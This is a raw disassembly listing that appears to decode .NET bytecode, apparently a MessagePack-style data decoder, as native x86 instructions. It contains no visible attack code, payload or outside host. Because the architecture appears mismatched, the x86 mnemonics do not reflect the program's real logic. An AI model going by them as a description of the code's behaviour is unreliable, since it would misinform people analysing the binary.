  404c42:	00 00                	add    %al,(%eax)
  404c44:	14 2a                	adc    $0x2a,%al
  404c46:	07                   	pop    %es
  404c47:	8e 69 17             	mov    0x17(%ecx),%gs
  404c4a:	3e 41                	ds inc %ecx
  404c4c:	00 00                	add    %al,(%eax)
  404c4e:	00 16                	add    %dl,(%esi)
  404c50:	0d 38 32 00 00       	or     $0x3238,%eax
  404c55:	00 07                	add    %al,(%edi)
  404c57:	09 a3 38 00 00 01    	or     %esp,0x1000038(%ebx)
  404c5d:	0c 06                	or     $0x6,%al
  404c5f:	08 6f 6e             	or     %ch,0x6e(%edi)
  404c62:	00 00                	add    %al,(%eax)
  404c64:	06                   	push   %es
  404c65:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404c68:	04 3a                	add    $0x3a,%al
  404c6a:	13 00                	adc    (%eax),%eax
  404c6c:	00 00                	add    %al,(%eax)
  404c6e:	06                   	push   %es
  404c6f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c70:	6f                   	outsl  %ds:(%esi),(%dx)
  404c71:	00 00                	add    %al,(%eax)
  404c73:	06                   	push   %es
  404c74:	0a 06                	or     (%esi),%al
  404c76:	08 6f 6a             	or     %ch,0x6a(%edi)
  404c79:	00 00                	add    %al,(%eax)
  404c7b:	06                   	push   %es
  404c7c:	38 03                	cmp    %al,(%ebx)
  404c7e:	00 00                	add    %al,(%eax)
  404c80:	00 11                	add    %dl,(%ecx)
  404c82:	04 0a                	add    $0xa,%al
  404c84:	09 17                	or     %edx,(%edi)
  404c86:	58                   	pop    %eax
  404c87:	0d 09 07 8e 69       	or     $0x698e0709,%eax
  404c8c:	17                   	pop    %ss
  404c8d:	59                   	pop    %ecx
  404c8e:	32 c6                	xor    %dh,%al
  404c90:	07                   	pop    %es
  404c91:	07                   	pop    %es
  404c92:	8e 69 17             	mov    0x17(%ecx),%gs
  404c95:	59                   	pop    %ecx
  404c96:	a3 38 00 00 01       	mov    %eax,0x1000038
  404c9b:	0c 06                	or     $0x6,%al
  404c9d:	08 6f 6d             	or     %ch,0x6d(%edi)
  404ca0:	00 00                	add    %al,(%eax)
  404ca2:	06                   	push   %es
  404ca3:	13 05 11 05 15 3e    	adc    0x3e150511,%eax
  404ca9:	0e                   	push   %cs
  404caa:	00 00                	add    %al,(%eax)
  404cac:	00 06                	add    %al,(%esi)
  404cae:	7b 38                	jnp    0x404ce8
  404cb0:	00 00                	add    %al,(%eax)
  404cb2:	04 11                	add    $0x11,%al
  404cb4:	05 6f ea 00 00       	add    $0xea6f,%eax
  404cb9:	0a 2a                	or     (%edx),%ch
  404cbb:	06                   	push   %es
  404cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbd:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbe:	00 00                	add    %al,(%eax)
  404cc0:	06                   	push   %es
  404cc1:	0a 06                	or     (%esi),%al
  404cc3:	08 6f 6a             	or     %ch,0x6a(%edi)
  404cc6:	00 00                	add    %al,(%eax)
  404cc8:	06                   	push   %es
  404cc9:	06                   	push   %es
  404cca:	2a 00                	sub    (%eax),%al
  404ccc:	1b 30                	sbb    (%eax),%esi
  404cce:	04 00                	add    $0x0,%al
  404cd0:	3b 00                	cmp    (%eax),%eax
  404cd2:	00 00                	add    %al,(%eax)
  404cd4:	24 00                	and    $0x0,%al
  404cd6:	00 11                	add    %dl,(%ecx)
  404cd8:	73 d0                	jae    0x404caa
  404cda:	00 00                	add    %al,(%eax)
  404cdc:	0a 0a                	or     (%edx),%cl
  404cde:	03 28                	add    (%eax),%ebp
  404ce0:	a2 00 00 06 10       	mov    %al,0x10060000
  404ce5:	01 06                	add    %eax,(%esi)
  404ce7:	03 16                	add    (%esi),%edx
  404ce9:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404cef:	00 0a                	add    %cl,(%edx)
  404cf1:	06                   	push   %es
  404cf2:	16                   	push   %ss
  404cf3:	6a 6f                	push   $0x6f
  404cf5:	4e                   	dec    %esi
  404cf6:	00 00                	add    %al,(%eax)
  404cf8:	0a 02                	or     (%edx),%al
  404cfa:	06                   	push   %es
  404cfb:	28 88 00 00 06 dd    	sub    %cl,-0x22fa0000(%eax)
  404d01:	0d 00 00 00 06       	or     $0x6000000,%eax
  404d06:	39 06                	cmp    %eax,(%esi)
  404d08:	00 00                	add    %al,(%eax)
  404d0a:	00 06                	add    %al,(%esi)
  404d0c:	6f                   	outsl  %ds:(%esi),(%dx)
  404d0d:	33 00                	xor    (%eax),%eax
  404d0f:	00 0a                	add    %cl,(%edx)
  404d11:	dc 2a                	fsubrl (%edx)
  404d13:	00 01                	add    %al,(%ecx)
  404d15:	10 00                	adc    %al,(%eax)
  404d17:	00 02                	add    %al,(%edx)
  404d19:	00 06                	add    %al,(%esi)
  404d1b:	00 27                	add    %ah,(%edi)
  404d1d:	2d 00 0d 00 00       	sub    $0xd00,%eax
  404d22:	00 00                	add    %al,(%eax)
  404d24:	13 30                	adc    (%eax),%esi
  404d26:	02 00                	add    (%eax),%al
  404d28:	16                   	push   %ss
  404d29:	00 00                	add    %al,(%eax)
  404d2b:	00 25 00 00 11 03    	add    %ah,0x3110000
  404d31:	19 73 6c             	sbb    %esi,0x6c(%ebx)
  404d34:	00 00                	add    %al,(%eax)
  404d36:	0a 0a                	or     (%edx),%cl
  404d38:	02 06                	add    (%esi),%al
  404d3a:	28 88 00 00 06 06    	sub    %cl,0x6060000(%eax)
  404d40:	6f                   	outsl  %ds:(%esi),(%dx)
  404d41:	40                   	inc    %eax
  404d42:	00 00                	add    %al,(%eax)
  404d44:	0a 2a                	or     (%edx),%ch
  404d46:	00 00                	add    %al,(%eax)
  404d48:	13 30                	adc    (%eax),%esi
  404d4a:	04 00                	add    $0x0,%al
  404d4c:	07                   	pop    %es
  404d4d:	06                   	push   %es
  404d4e:	00 00                	add    %al,(%eax)
  404d50:	26 00 00             	add    %al,%es:(%eax)
  404d53:	11 03                	adc    %eax,(%ebx)
  404d55:	6f                   	outsl  %ds:(%esi),(%dx)
  404d56:	00 01                	add    %al,(%ecx)
  404d58:	00 0a                	add    %cl,(%edx)
  404d5a:	d2 0a                	rorb   %cl,(%edx)
  404d5c:	14 0b                	adc    $0xb,%al
  404d5e:	16                   	push   %ss
  404d5f:	0c 16                	or     $0x16,%al
  404d61:	0d 06 1f 7f 3d       	or     $0x3d7f1f06,%eax
  404d66:	09 00                	or     %eax,(%eax)
  404d68:	00 00                	add    %al,(%eax)
  404d6a:	02 06                	add    (%esi),%al
  404d6c:	6e                   	outsb  %ds:(%esi),(%dx)
  404d6d:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  404d71:	06                   	push   %es
  404d72:	2a 06                	sub    (%esi),%al
  404d74:	20 80 00 00 00 3f    	and    %al,0x3f000000(%eax)
  404d7a:	48                   	dec    %eax
  404d7b:	00 00                	add    %al,(%eax)
  404d7d:	00 06                	add    %al,(%esi)
  404d7f:	20 8f 00 00 00 3d    	and    %cl,0x3d000000(%edi)
  404d85:	3d 00 00 00 02       	cmp    $0x2000000,%eax
  404d8a:	28 6b 00             	sub    %ch,0x0(%ebx)
  404d8d:	00 06                	add    %al,(%esi)
  404d8f:	02 18                	add    (%eax),%bl
  404d91:	7d 36                	jge    0x404dc9
  404d93:	00 00                	add    %al,(%eax)
  404d95:	04 06                	add    $0x6,%al
  404d97:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  404d9d:	0c 16                	or     $0x16,%al
  404d9f:	0d 38 1c 00 00       	or     $0x1c38,%eax
  404da4:	00 02                	add    %al,(%edx)
  404da6:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404daa:	06                   	push   %es
  404dab:	25 03 28 96 00       	and    $0x962803,%eax
  404db0:	00 06                	add    %al,(%esi)
  404db2:	6f                   	outsl  %ds:(%esi),(%dx)
  404db3:	6a 00                	push   $0x0
  404db5:	00 06                	add    %al,(%esi)
  404db7:	03 6f 88             	add    -0x78(%edi),%ebp
  404dba:	00 00                	add    %al,(%eax)
  404dbc:	06                   	push   %es
  404dbd:	09 17                	or     %edx,(%edi)
  404dbf:	58                   	pop    %eax
  404dc0:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  404dc5:	2a 06                	sub    (%esi),%al
  404dc7:	20 90 00 00 00 3f    	and    %dl,0x3f000000(%eax)
  404dcd:	3c 00                	cmp    $0x0,%al
  404dcf:	00 00                	add    %al,(%eax)
  404dd1:	06                   	push   %es
  404dd2:	20 9f 00 00 00 3d    	and    %bl,0x3d000000(%edi)
  404dd8:	31 00                	xor    %eax,(%eax)
  404dda:	00 00                	add    %al,(%eax)
  404ddc:	02 28                	add    (%eax),%ch
  404dde:	6b 00 00             	imul   $0x0,(%eax),%eax
  404de1:	06                   	push   %es
  404de2:	02 19                	add    (%ecx),%bl
  404de4:	7d 36                	jge    0x404e1c
  404de6:	00 00                	add    %al,(%eax)
  404de8:	04 06                	add    $0x6,%al
  404dea:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  404df0:	0c 16                	or     $0x16,%al
  404df2:	0d 38 10 00 00       	or     $0x1038,%eax
  404df7:	00 02                	add    %al,(%edx)
  404df9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404dfd:	06                   	push   %es
  404dfe:	03 6f 88             	add    -0x78(%edi),%ebp
  404e01:	00 00                	add    %al,(%eax)
  404e03:	06                   	push   %es
  404e04:	09 17                	or     %edx,(%edi)
  404e06:	58                   	pop    %eax
  404e07:	0d 09 08 32 ec       	or     $0xec320809,%eax
  404e0c:	2a 06                	sub    (%esi),%al
  404e0e:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  404e14:	21 00                	and    %eax,(%eax)
  404e16:	00 00                	add    %al,(%eax)
  404e18:	06                   	push   %es
  404e19:	20 bf 00 00 00 3d    	and    %bh,0x3d000000(%edi)
  404e1f:	16                   	push   %ss
  404e20:	00 00                	add    %al,(%eax)
  404e22:	00 06                	add    %al,(%esi)
  404e24:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  404e2a:	0c 02                	or     $0x2,%al
  404e2c:	03 08                	add    (%eax),%ecx
  404e2e:	28 95 00 00 06 28    	sub    %dl,0x28060000(%ebp)
  404e34:	81 00 00 06 2a 06    	addl   $0x62a0600,(%eax)
  404e3a:	20 e0                	and    %ah,%al
  404e3c:	00 00                	add    %al,(%eax)
  404e3e:	00 3f                	add    %bh,(%edi)
  404e40:	15 00 00 00 06       	adc    $0x6000000,%eax
  404e45:	20 ff                	and    %bh,%bh
  404e47:	00 00                	add    %al,(%eax)
  404e49:	00 3d 0a 00 00 00    	add    %bh,0xa
  404e4f:	02 06                	add    (%esi),%al
  404e51:	67 6a 28             	addr16 push $0x28
  404e54:	74 00                	je     0x404e56
  404e56:	00 06                	add    %al,(%esi)
  404e58:	2a 06                	sub    (%esi),%al
  404e5a:	20 c0                	and    %al,%al
  404e5c:	00 00                	add    %al,(%eax)
  404e5e:	00 40 07             	add    %al,0x7(%eax)
  404e61:	00 00                	add    %al,(%eax)
  404e63:	00 02                	add    %al,(%edx)
  404e65:	28 80 00 00 06 2a    	sub    %al,0x2a060000(%eax)
  404e6b:	06                   	push   %es
  404e6c:	20 c1                	and    %al,%cl
  404e6e:	00 00                	add    %al,(%eax)
  404e70:	00 40 0b             	add    %al,0xb(%eax)
  404e73:	00 00                	add    %al,(%eax)
  404e75:	00 72 fc             	add    %dh,-0x4(%edx)
  404e78:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404e7c:	01 01                	add    %eax,(%ecx)
  404e7e:	00 0a                	add    %cl,(%edx)
  404e80:	7a 06                	jp     0x404e88
  404e82:	20 c2                	and    %al,%dl
  404e84:	00 00                	add    %al,(%eax)
  404e86:	00 40 08             	add    %al,0x8(%eax)
  404e89:	00 00                	add    %al,(%eax)
  404e8b:	00 02                	add    %al,(%edx)
  404e8d:	16                   	push   %ss
  404e8e:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404e94:	06                   	push   %es
  404e95:	20 c3                	and    %al,%bl
  404e97:	00 00                	add    %al,(%eax)
  404e99:	00 40 08             	add    %al,0x8(%eax)
  404e9c:	00 00                	add    %al,(%eax)
  404e9e:	00 02                	add    %al,(%edx)
  404ea0:	17                   	pop    %ss
  404ea1:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404ea7:	06                   	push   %es
  404ea8:	20 c4                	and    %al,%ah
  404eaa:	00 00                	add    %al,(%eax)
  404eac:	00 40 20             	add    %al,0x20(%eax)
  404eaf:	00 00                	add    %al,(%eax)
  404eb1:	00 03                	add    %al,(%ebx)
  404eb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404eb4:	00 01                	add    %al,(%ecx)
  404eb6:	00 0a                	add    %cl,(%edx)
  404eb8:	0c 08                	or     $0x8,%al
  404eba:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ebe:	01 0b                	add    %ecx,(%ebx)
  404ec0:	03 07                	add    (%edi),%eax
  404ec2:	16                   	push   %ss
  404ec3:	08 6f 45             	or     %ch,0x45(%edi)
  404ec6:	00 00                	add    %al,(%eax)
  404ec8:	0a 26                	or     (%esi),%ah
  404eca:	02 07                	add    (%edi),%al
  404ecc:	28 79 00             	sub    %bh,0x0(%ecx)
  404ecf:	00 06                	add    %al,(%esi)
  404ed1:	2a 06                	sub    (%esi),%al
  404ed3:	20 c5                	and    %al,%ch
  404ed5:	00 00                	add    %al,(%eax)
  404ed7:	00 40 39             	add    %al,0x39(%eax)
  404eda:	00 00                	add    %al,(%eax)
  404edc:	00 18                	add    %bl,(%eax)
  404ede:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ee2:	01 0b                	add    %ecx,(%ebx)
  404ee4:	03 07                	add    (%edi),%eax
  404ee6:	16                   	push   %ss
  404ee7:	18 6f 45             	sbb    %ch,0x45(%edi)
  404eea:	00 00                	add    %al,(%eax)
  404eec:	0a 26                	or     (%esi),%ah
  404eee:	07                   	pop    %es
  404eef:	28 58 00             	sub    %bl,0x0(%eax)
  404ef2:	00 06                	add    %al,(%esi)
  404ef4:	0b 07                	or     (%edi),%eax
  404ef6:	16                   	push   %ss
  404ef7:	28 02                	sub    %al,(%edx)
  404ef9:	01 00                	add    %eax,(%eax)
  404efb:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404efe:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f02:	01 0b                	add    %ecx,(%ebx)
  404f04:	03 07                	add    (%edi),%eax
  404f06:	16                   	push   %ss
  404f07:	08 6f 45             	or     %ch,0x45(%edi)
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	0a 26                	or     (%esi),%ah
  404f0e:	02 07                	add    (%edi),%al
  404f10:	28 79 00             	sub    %bh,0x0(%ecx)
  404f13:	00 06                	add    %al,(%esi)
  404f15:	2a 06                	sub    (%esi),%al
  404f17:	20 c6                	and    %al,%dh
  404f19:	00 00                	add    %al,(%eax)
  404f1b:	00 40 39             	add    %al,0x39(%eax)
  404f1e:	00 00                	add    %al,(%eax)
  404f20:	00 1a                	add    %bl,(%edx)
  404f22:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f26:	01 0b                	add    %ecx,(%ebx)
  404f28:	03 07                	add    (%edi),%eax
  404f2a:	16                   	push   %ss
  404f2b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f2e:	00 00                	add    %al,(%eax)
  404f30:	0a 26                	or     (%esi),%ah
  404f32:	07                   	pop    %es
  404f33:	28 58 00             	sub    %bl,0x0(%eax)
  404f36:	00 06                	add    %al,(%esi)
  404f38:	0b 07                	or     (%edi),%eax
  404f3a:	16                   	push   %ss
  404f3b:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  404f3f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f42:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f46:	01 0b                	add    %ecx,(%ebx)
  404f48:	03 07                	add    (%edi),%eax
  404f4a:	16                   	push   %ss
  404f4b:	08 6f 45             	or     %ch,0x45(%edi)
  404f4e:	00 00                	add    %al,(%eax)
  404f50:	0a 26                	or     (%esi),%ah
  404f52:	02 07                	add    (%edi),%al
  404f54:	28 79 00             	sub    %bh,0x0(%ecx)
  404f57:	00 06                	add    %al,(%esi)
  404f59:	2a 06                	sub    (%esi),%al
  404f5b:	20 c7                	and    %al,%bh
  404f5d:	00 00                	add    %al,(%eax)
  404f5f:	00 3b                	add    %bh,(%ebx)
  404f61:	16                   	push   %ss
  404f62:	00 00                	add    %al,(%eax)
  404f64:	00 06                	add    %al,(%esi)
  404f66:	20 c8                	and    %cl,%al
  404f68:	00 00                	add    %al,(%eax)
  404f6a:	00 3b                	add    %bh,(%ebx)
  404f6c:	0b 00                	or     (%eax),%eax
  404f6e:	00 00                	add    %al,(%eax)
  404f70:	06                   	push   %es
  404f71:	20 c9                	and    %cl,%cl
  404f73:	00 00                	add    %al,(%eax)
  404f75:	00 40 0b             	add    %al,0xb(%eax)
  404f78:	00 00                	add    %al,(%eax)
  404f7a:	00 72 28             	add    %dh,0x28(%edx)
  404f7d:	27                   	daa
  404f7e:	00 70 73             	add    %dh,0x73(%eax)
  404f81:	01 01                	add    %eax,(%ecx)
  404f83:	00 0a                	add    %cl,(%edx)
  404f85:	7a 06                	jp     0x404f8d
  404f87:	20 ca                	and    %cl,%dl
  404f89:	00 00                	add    %al,(%eax)
  404f8b:	00 40 26             	add    %al,0x26(%eax)
  404f8e:	00 00                	add    %al,(%eax)
  404f90:	00 1a                	add    %bl,(%edx)
  404f92:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f96:	01 0b                	add    %ecx,(%ebx)
  404f98:	03 07                	add    (%edi),%eax
  404f9a:	16                   	push   %ss
  404f9b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f9e:	00 00                	add    %al,(%eax)
  404fa0:	0a 26                	or     (%esi),%ah
  404fa2:	07                   	pop    %es
  404fa3:	28 58 00             	sub    %bl,0x0(%eax)
  404fa6:	00 06                	add    %al,(%esi)
  404fa8:	0b 02                	or     (%edx),%eax
  404faa:	07                   	pop    %es
  404fab:	16                   	push   %ss
  404fac:	28 03                	sub    %al,(%ebx)
  404fae:	01 00                	add    %eax,(%eax)
  404fb0:	0a 28                	or     (%eax),%ch
  404fb2:	84 00                	test   %al,(%eax)
  404fb4:	00 06                	add    %al,(%esi)
  404fb6:	2a 06                	sub    (%esi),%al
  404fb8:	20 cb                	and    %cl,%bl
  404fba:	00 00                	add    %al,(%eax)
  404fbc:	00 40 26             	add    %al,0x26(%eax)
  404fbf:	00 00                	add    %al,(%eax)
  404fc1:	00 1e                	add    %bl,(%esi)
  404fc3:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404fc7:	01 0b                	add    %ecx,(%ebx)
  404fc9:	03 07                	add    (%edi),%eax
  404fcb:	16                   	push   %ss
  404fcc:	1e                   	push   %ds
  404fcd:	6f                   	outsl  %ds:(%esi),(%dx)
  404fce:	45                   	inc    %ebp
  404fcf:	00 00                	add    %al,(%eax)
  404fd1:	0a 26                	or     (%esi),%ah
  404fd3:	07                   	pop    %es
  404fd4:	28 58 00             	sub    %bl,0x0(%eax)
  404fd7:	00 06                	add    %al,(%esi)
  404fd9:	0b 02                	or     (%edx),%eax
  404fdb:	07                   	pop    %es
  404fdc:	16                   	push   %ss
  404fdd:	28 04 01             	sub    %al,(%ecx,%eax,1)
  404fe0:	00 0a                	add    %cl,(%edx)
  404fe2:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  404fe8:	06                   	push   %es
  404fe9:	20 cc                	and    %cl,%ah
  404feb:	00 00                	add    %al,(%eax)
  404fed:	00 40 11             	add    %al,0x11(%eax)
  404ff0:	00 00                	add    %al,(%eax)
  404ff2:	00 03                	add    %al,(%ebx)
  404ff4:	6f                   	outsl  %ds:(%esi),(%dx)
  404ff5:	00 01                	add    %al,(%ecx)
  404ff7:	00 0a                	add    %cl,(%edx)
  404ff9:	d2 0a                	rorb   %cl,(%edx)
  404ffb:	02 06                	add    (%esi),%al
  404ffd:	6e                   	outsb  %ds:(%esi),(%dx)
  404ffe:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405002:	06                   	push   %es
  405003:	2a 06                	sub    (%esi),%al
  405005:	20 cd                	and    %cl,%ch
  405007:	00 00                	add    %al,(%eax)
  405009:	00 40 27             	add    %al,0x27(%eax)
  40500c:	00 00                	add    %al,(%eax)
  40500e:	00 18                	add    %bl,(%eax)
  405010:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405014:	01 0b                	add    %ecx,(%ebx)
  405016:	03 07                	add    (%edi),%eax
  405018:	16                   	push   %ss
  405019:	18 6f 45             	sbb    %ch,0x45(%edi)
  40501c:	00 00                	add    %al,(%eax)
  40501e:	0a 26                	or     (%esi),%ah
  405020:	07                   	pop    %es
  405021:	28 58 00             	sub    %bl,0x0(%eax)
  405024:	00 06                	add    %al,(%esi)
  405026:	0b 02                	or     (%edx),%eax
  405028:	07                   	pop    %es
  405029:	16                   	push   %ss
  40502a:	28 02                	sub    %al,(%edx)
  40502c:	01 00                	add    %eax,(%eax)
  40502e:	0a 6e 28             	or     0x28(%esi),%ch
  405031:	74 00                	je     0x405033
  405033:	00 06                	add    %al,(%esi)
  405035:	2a 06                	sub    (%esi),%al
  405037:	20 ce                	and    %cl,%dh
  405039:	00 00                	add    %al,(%eax)
  40503b:	00 40 27             	add    %al,0x27(%eax)
  40503e:	00 00                	add    %al,(%eax)
  405040:	00 1a                	add    %bl,(%edx)
  405042:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405046:	01 0b                	add    %ecx,(%ebx)
  405048:	03 07                	add    (%edi),%eax
  40504a:	16                   	push   %ss
  40504b:	1a 6f 45             	sbb    0x45(%edi),%ch
  40504e:	00 00                	add    %al,(%eax)
  405050:	0a 26                	or     (%esi),%ah
  405052:	07                   	pop    %es
  405053:	28 58 00             	sub    %bl,0x0(%eax)
  405056:	00 06                	add    %al,(%esi)
  405058:	0b 02                	or     (%edx),%eax
  40505a:	07                   	pop    %es
  40505b:	16                   	push   %ss
  40505c:	28 05 01 00 0a 6e    	sub    %al,0x6e0a0001
  405062:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405066:	06                   	push   %es
  405067:	2a 06                	sub    (%esi),%al
  405069:	20 cf                	and    %cl,%bh
  40506b:	00 00                	add    %al,(%eax)
  40506d:	00 40 26             	add    %al,0x26(%eax)
  405070:	00 00                	add    %al,(%eax)
  405072:	00 1e                	add    %bl,(%esi)
  405074:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405078:	01 0b                	add    %ecx,(%ebx)
  40507a:	03 07                	add    (%edi),%eax
  40507c:	16                   	push   %ss
  40507d:	1e                   	push   %ds
  40507e:	6f                   	outsl  %ds:(%esi),(%dx)
  40507f:	45                   	inc    %ebp
  405080:	00 00                	add    %al,(%eax)
  405082:	0a 26                	or     (%esi),%ah
  405084:	07                   	pop    %es
  405085:	28 58 00             	sub    %bl,0x0(%eax)
  405088:	00 06                	add    %al,(%esi)
  40508a:	0b 02                	or     (%edx),%eax
  40508c:	07                   	pop    %es
  40508d:	16                   	push   %ss
  40508e:	28 06                	sub    %al,(%esi)
  405090:	01 00                	add    %eax,(%eax)
  405092:	0a 28                	or     (%eax),%ch
  405094:	75 00                	jne    0x405096
  405096:	00 06                	add    %al,(%esi)
  405098:	2a 06                	sub    (%esi),%al
  40509a:	20 dc                	and    %bl,%ah
  40509c:	00 00                	add    %al,(%eax)
  40509e:	00 40 49             	add    %al,0x49(%eax)
  4050a1:	00 00                	add    %al,(%eax)
  4050a3:	00 18                	add    %bl,(%eax)
  4050a5:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050a9:	01 0b                	add    %ecx,(%ebx)
  4050ab:	03 07                	add    (%edi),%eax
  4050ad:	16                   	push   %ss
  4050ae:	18 6f 45             	sbb    %ch,0x45(%edi)
  4050b1:	00 00                	add    %al,(%eax)
  4050b3:	0a 26                	or     (%esi),%ah
  4050b5:	07                   	pop    %es
  4050b6:	28 58 00             	sub    %bl,0x0(%eax)
  4050b9:	00 06                	add    %al,(%esi)
  4050bb:	0b 07                	or     (%edi),%eax
  4050bd:	16                   	push   %ss
  4050be:	28 07                	sub    %al,(%edi)
  4050c0:	01 00                	add    %eax,(%eax)
  4050c2:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4050c5:	28 6b 00             	sub    %ch,0x0(%ebx)
  4050c8:	00 06                	add    %al,(%esi)
  4050ca:	02 19                	add    (%ecx),%bl
  4050cc:	7d 36                	jge    0x405104
  4050ce:	00 00                	add    %al,(%eax)
  4050d0:	04 16                	add    $0x16,%al
  4050d2:	0d 38 10 00 00       	or     $0x1038,%eax
  4050d7:	00 02                	add    %al,(%edx)
  4050d9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4050dd:	06                   	push   %es
  4050de:	03 6f 88             	add    -0x78(%edi),%ebp
  4050e1:	00 00                	add    %al,(%eax)
  4050e3:	06                   	push   %es
  4050e4:	09 17                	or     %edx,(%edi)
  4050e6:	58                   	pop    %eax
  4050e7:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4050ec:	2a 06                	sub    (%esi),%al
  4050ee:	20 dd                	and    %bl,%ch
  4050f0:	00 00                	add    %al,(%eax)
  4050f2:	00 40 49             	add    %al,0x49(%eax)
  4050f5:	00 00                	add    %al,(%eax)
  4050f7:	00 1a                	add    %bl,(%edx)
  4050f9:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050fd:	01 0b                	add    %ecx,(%ebx)
  4050ff:	03 07                	add    (%edi),%eax
  405101:	16                   	push   %ss
  405102:	1a 6f 45             	sbb    0x45(%edi),%ch
  405105:	00 00                	add    %al,(%eax)
  405107:	0a 26                	or     (%esi),%ah
  405109:	07                   	pop    %es
  40510a:	28 58 00             	sub    %bl,0x0(%eax)
  40510d:	00 06                	add    %al,(%esi)
  40510f:	0b 07                	or     (%edi),%eax
  405111:	16                   	push   %ss
  405112:	28 07                	sub    %al,(%edi)
  405114:	01 00                	add    %eax,(%eax)
  405116:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405119:	28 6b 00             	sub    %ch,0x0(%ebx)
  40511c:	00 06                	add    %al,(%esi)
  40511e:	02 19                	add    (%ecx),%bl
  405120:	7d 36                	jge    0x405158
  405122:	00 00                	add    %al,(%eax)
  405124:	04 16                	add    $0x16,%al
  405126:	0d 38 10 00 00       	or     $0x1038,%eax
  40512b:	00 02                	add    %al,(%edx)
  40512d:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405131:	06                   	push   %es
  405132:	03 6f 88             	add    -0x78(%edi),%ebp
  405135:	00 00                	add    %al,(%eax)
  405137:	06                   	push   %es
  405138:	09 17                	or     %edx,(%edi)
  40513a:	58                   	pop    %eax
  40513b:	0d 09 08 32 ec       	or     $0xec320809,%eax
  405140:	2a 06                	sub    (%esi),%al
  405142:	20 d9                	and    %bl,%cl
  405144:	00 00                	add    %al,(%eax)
  405146:	00 40 0e             	add    %al,0xe(%eax)
  405149:	00 00                	add    %al,(%eax)
  40514b:	00 02                	add    %al,(%edx)
  40514d:	06                   	push   %es
  40514e:	03 28                	add    (%eax),%ebp
  405150:	97                   	xchg   %eax,%edi
  405151:	00 00                	add    %al,(%eax)
  405153:	06                   	push   %es
  405154:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  40515a:	06                   	push   %es
  40515b:	20 de                	and    %bl,%dh
  40515d:	00 00                	add    %al,(%eax)
  40515f:	00 40 55             	add    %al,0x55(%eax)
  405162:	00 00                	add    %al,(%eax)
  405164:	00 18                	add    %bl,(%eax)
  405166:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40516a:	01 0b                	add    %ecx,(%ebx)
  40516c:	03 07                	add    (%edi),%eax
  40516e:	16                   	push   %ss
  40516f:	18 6f 45             	sbb    %ch,0x45(%edi)
  405172:	00 00                	add    %al,(%eax)
  405174:	0a 26                	or     (%esi),%ah
  405176:	07                   	pop    %es
  405177:	28 58 00             	sub    %bl,0x0(%eax)
  40517a:	00 06                	add    %al,(%esi)
  40517c:	0b 07                	or     (%edi),%eax
  40517e:	16                   	push   %ss
  40517f:	28 07                	sub    %al,(%edi)
  405181:	01 00                	add    %eax,(%eax)
  405183:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405186:	28 6b 00             	sub    %ch,0x0(%ebx)
  405189:	00 06                	add    %al,(%esi)
  40518b:	02 18                	add    (%eax),%bl
  40518d:	7d 36                	jge    0x4051c5
  40518f:	00 00                	add    %al,(%eax)
  405191:	04 16                	add    $0x16,%al
  405193:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405198:	00 02                	add    %al,(%edx)
  40519a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40519e:	06                   	push   %es
  40519f:	25 03 28 96 00       	and    $0x962803,%eax
  4051a4:	00 06                	add    %al,(%esi)
  4051a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4051a7:	6a 00                	push   $0x0
  4051a9:	00 06                	add    %al,(%esi)
  4051ab:	03 6f 88             	add    -0x78(%edi),%ebp
  4051ae:	00 00                	add    %al,(%eax)
  4051b0:	06                   	push   %es
  4051b1:	09 17                	or     %edx,(%edi)
  4051b3:	58                   	pop    %eax
  4051b4:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  4051b9:	2a 06                	sub    (%esi),%al
  4051bb:	20 de                	and    %bl,%dh
  4051bd:	00 00                	add    %al,(%eax)
